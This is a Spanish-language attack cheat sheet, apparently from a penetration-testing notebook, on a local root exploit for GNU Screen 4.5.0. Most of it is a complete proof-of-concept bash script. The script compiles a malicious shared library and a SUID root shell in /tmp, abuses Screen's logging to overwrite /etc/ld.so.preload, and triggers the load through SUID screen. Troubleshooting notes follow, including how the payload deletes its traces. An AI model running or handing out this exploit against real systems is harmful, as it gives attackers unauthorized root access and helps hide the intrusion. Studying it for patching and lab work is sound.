---
tags:
  - linux
  - privex
  - attack
---
## Conceptos Clave (TL;DR)
* La versión 4.5.0 del multiplexor de terminal Screen contiene una vulnerabilidad de escalamiento de privilegios originada por la falta de verificación de permisos al abrir un archivo de registro.
* Esta debilidad permite a un atacante local truncar un archivo o crear uno nuevo perteneciente a "root" en cualquier directorio del sistema.
* La técnica de explotación abusa de esta falla para sobrescribir el archivo `/etc/ld.so.preload`, logrando así la carga de una biblioteca compartida (shared library) maliciosa que otorga una shell con privilegios máximos.

## Herramientas Clave
* **Screen**: El servicio de terminal vulnerable cuya funcionalidad de registro (logging) es abusada para la escritura arbitraria de archivos.
* **gcc**: Compilador necesario en la máquina objetivo para ensamblar el payload en C (biblioteca compartida maliciosa) y el binario de la shell antes de la ejecución.

## Metodología Paso a Paso
1. **Identificación de la versión**: Confirmar la versión exacta de GNU Screen en el sistema comprometido para validar si es vulnerable a este fallo específico.
2. **Creación del código fuente malicioso**: Generar dos archivos en C temporales: uno para una biblioteca maliciosa (`libhax.c`) encargada de modificar los permisos de la shell, y otro (`rootshell.c`) diseñado para ejecutar `/bin/sh` como root.
3. **Compilación local**: Compilar el código en C directamente en la máquina víctima utilizando `gcc` para asegurar la compatibilidad con la arquitectura local.
4. **Explotación (Sobrescritura de ld.so.preload)**: Utilizar banderas de ejecución de Screen para inyectar la ruta de la biblioteca maliciosa compilada dentro de `/etc/ld.so.preload`.
5. **Ejecución y obtención de root**: Ejecutar cualquier binario SUID (como el propio comando `screen`) para activar la carga del archivo modificado, y finalmente invocar el binario compilado de la shell para consolidar el acceso como root.

## Cheat Sheet de Comandos

```bash
# Verifica la version instalada de GNU Screen en el sistema objetivo
screen -v
```

```bash
# Ejecuta el script automatizado del exploit (asumiendo que tiene permisos de ejecucion)
./screen_exploit.sh
```

```bash
# Verifica el acceso comprobando que el UID devuelto sea 0 (root)
id
```

```bash
# Script completo de Prueba de Concepto (PoC) para Screen v4.5.0
#!/bin/bash

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

# Genera el codigo fuente para la biblioteca compartida que dara permisos SUID a la shell
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

# Compila la biblioteca maliciosa como un objeto compartido (-shared) independiente de la posicion (-fPIC)
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

# Genera el codigo fuente del ejecutable de la shell
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF

# Compila el ejecutable de la shell, ignorando advertencias de declaraciones implicitas
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c

echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000

# Fuerza a screen a registrar (-L) en el archivo ld.so.preload, inyectando la ruta de la biblioteca maliciosa
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"

echo "[+] Triggering..."

# Ejecuta screen (que cuenta con permisos SUID por defecto) desencadenando la carga desde ld.so.preload
screen -ls

# Ejecuta la shell comprometida
/tmp/rootshell
```

## "Gotchas" y Troubleshooting
* Se requiere que la herramienta `gcc` se encuentre instalada en el sistema víctima para poder compilar los componentes C (`libhax.c` y `rootshell.c`) requeridos por el script.
* El exploit implica la escritura de archivos dentro de los directorios `/tmp/` y `/etc/`. Si la partición `/tmp` está montada bajo restricciones como `noexec`, la ejecución de la prueba de concepto fallará y será necesario modificar el script hacia otro directorio escribible.
* El código del payload contenido en `libhax.c` utiliza la instrucción `unlink("/etc/ld.so.preload")` para borrarse a sí mismo y limpiar los rastros, evitando la ruptura de binarios subsiguientes en el sistema víctima tras el éxito del ataque.
* Durante la ejecución de la prueba de concepto, es altamente probable observar mensajes de error por consola informando que el archivo no puede precargarse (ej. `cannot be preloaded (cannot open shared object file): ignored`); estos pueden ser ignorados de forma segura ya que el exploit continuará su curso.